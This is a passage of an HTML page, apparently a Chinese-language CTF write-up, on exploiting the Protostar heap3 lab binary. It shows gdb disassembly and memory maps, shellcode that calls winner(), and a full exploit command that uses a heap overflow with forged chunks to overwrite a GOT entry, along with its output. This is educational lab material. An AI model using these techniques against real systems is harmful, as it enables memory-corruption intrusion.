+0x08048922 &lt;main+153&gt;:  mov    eax,DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>
+0x08048926 &lt;main+157&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048929 &lt;main+160&gt;:  call   0x8049824 &lt;free&gt;
+0x0804892e &lt;main+165&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804ac27
+0x08048935 &lt;main+172&gt;:  call   0x8048790 &lt;puts@plt&gt;
+0x0804893a &lt;main+177&gt;:  leave  
+0x0804893b &lt;main+178&gt;:  ret    
+End of assembler dump.
+</code></pre></div>
+</details>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> x winner 
+0x8048864 &lt;winner&gt;: 0x83e58955
+<span class="o">(</span>gdb<span class="o">)</span> disassemble 0x8048790
+Dump of assembler code <span class="k">for</span> <span class="k">function</span> puts@plt:
+0x08048790 &lt;puts@plt+0&gt;:    jmp    DWORD PTR ds:0x804b128
+0x08048796 &lt;puts@plt+6&gt;:    push   0x68
+0x0804879b &lt;puts@plt+11&gt;:   jmp    0x80486b0
+End of assembler dump.
+<span class="o">(</span>gdb<span class="o">)</span> x 0x804b128
+0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x08048796
+<span class="o">(</span>gdb<span class="o">)</span> info proc map
+process <span class="m">17219</span>
+<span class="nv">cmdline</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/heap3&#39;</span>
+<span class="nv">cwd</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin&#39;</span>
+<span class="nv">exe</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/heap3&#39;</span>
+Mapped address spaces:
+
+  Start Addr   End Addr       Size     Offset objfile
+  0x8048000  0x804b000     0x3000          <span class="m">0</span>        /opt/protostar/bin/heap3
+  0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap3
+  0x804c000  0x804d000     0x1000          <span class="m">0</span>           <span class="o">[</span>heap<span class="o">]</span>
+  0xb7e96000 0xb7e97000     0x1000          <span class="m">0</span>        
+  0xb7e97000 0xb7fd5000   0x13e000          <span class="m">0</span>         /lib/libc-2.11.2.so
+  0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+  0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+  0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+  0xb7fd9000 0xb7fdc000     0x3000          <span class="m">0</span>        
+  0xb7fe0000 0xb7fe2000     0x2000          <span class="m">0</span>        
+  0xb7fe2000 0xb7fe3000     0x1000          <span class="m">0</span>           <span class="o">[</span>vdso<span class="o">]</span>
+  0xb7fe3000 0xb7ffe000    0x1b000          <span class="m">0</span>         /lib/ld-2.11.2.so
+  0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+  0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+  0xbffeb000 0xc0000000    0x15000          <span class="m">0</span>           <span class="o">[</span>stack<span class="o">]</span>
+</code></pre></div>
+</li>
+<li>
+<p>通过 <a href="https://defuse.ca/online-x86-assembler.htm">Online x86 / x64 Assembler and Disassembler</a> 将调用函数 <code>winner</code> 的汇编转换为 shellcode</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># move the address of winner() into eax and call</span>
+mov eax, 0x8048864
+call eax
+<span class="c1"># \xB8\x64\x88\x04\x08\xFF\xD0</span>
+</code></pre></div>
+</li>
+</ul>
+<h3 id="exploit_3">Exploit<a class="headerlink" href="#exploit_3" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>$ ./heap3 <span class="sb">`</span><span class="nb">echo</span> -ne <span class="s2">&quot;AAAA\xB8\x64\x88\x04\x08\xFF\xD0&quot;</span><span class="sb">`</span> <span class="sb">`</span>python -c <span class="s2">&quot;print(&#39;B&#39; * 36 + &#39;\x65&#39;)&quot;</span><span class="sb">`</span> <span class="sb">`</span>python -c <span class="s2">&quot;print(&#39;C&#39; * 92 + &#39;\xfc\xff\xff\xff&#39; * 2 + &#39;\x1c\xb1\x04\x08\x0c\xc0\x04\x08&#39;)&quot;</span><span class="sb">`</span>
+that wasn<span class="err">&#39;</span>t too bad now, was it? @ <span class="m">1662354454</span>
+Segmentation fault
+</code></pre></div>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      最后更新:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">December 8, 2022 11:02:00</span>
+      
+    
+  </small>
+</div>
+
+              
+
+  
+    <div class="md-source-date">
+      <small>
+          <span class="twemoji">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M5.5 3.5a2 2 0 1 0 0 4 2 2 0 0 0 0-4zM2 5.5a3.5 3.5 0 1 1 5.898 2.549 5.507 5.507 0 0 1 3.034 4.084.75.75 0 1 1-1.482.235 4.001 4.001 0 0 0-7.9 0 .75.75 0 0 1-1.482-.236A5.507 5.507 0 0 1 3.102 8.05 3.49 3.49 0 0 1 2 5.5zM11 4a.75.75 0 1 0 0 1.5 1.5 1.5 0 0 1 .666 2.844.75.75 0 0 0-.416.672v.352a.75.75 0 0 0 .574.73c1.2.289 2.162 1.2 2.522 2.372a.75.75 0 1 0 1.434-.44 5.01 5.01 0 0 0-2.56-3.012A3 3 0 0 0 11 4z"/></svg> 
+          </span>
+          Contributors: <span class='git-page-authors git-authors'><a href='mailto:137126578@qq.com'>YanhuiJessica</a></span>
+      </small>
+      <br>
+      <small>
+          <span id="busuanzi_container_page_pv">
+            <span class="twemoji">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0 8a5 5 0 0 1-5-5 5 5 0 0 1 5-5 5 5 0 0 1 5 5 5 5 0 0 1-5 5m0-12.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5Z"/></svg>
+            </span>
+            Pageviews: <span id="busuanzi_value_page_pv"></span>
+          </span>
+      </small>
+    </div>
+  
+  
+  <!-- Giscus -->
+  <h2 id="__comments">评论</h2>
+  <script src="https://giscus.app/client.js"
+      data-repo="YanhuiJessica/Chictf-Writeups"
+      data-repo-id="MDEwOlJlcG9zaXRvcnkyNDg1MTU1OTc="
+      data-category="General"
+      data-category-id="DIC_kwDODtAMDc4CP_N3"
+      data-mapping="title"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="light"
+      data-lang="zh-CN"
+      data-loading="lazy"
+      crossorigin="anonymous"
+      async>
+  </script>
+
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    /* Set palette on initial load */
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate" ? "dark" : "light"
+      giscus.setAttribute("data-theme", theme)
+    }
+
+    /* Register event handlers after documented loaded */
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate" ? "dark" : "light"
+
+          /* Instruct Giscus to change theme */
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+            </article>
+            
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            回到页面顶部
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="页脚" >
+      
+        
+        <a href="../format/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Format" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              Format
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../net/" class="md-footer__link md-footer__link--next" aria-label="下一页: Net" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              Net
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2020 - 2022 YanhuiJessica
+    </div>
+  
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/YanhuiJessica" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share"], "search": "../../../assets/javascripts/workers/search.b028fd86.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f758a944.min.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      
+    
+  </body>
+</html>
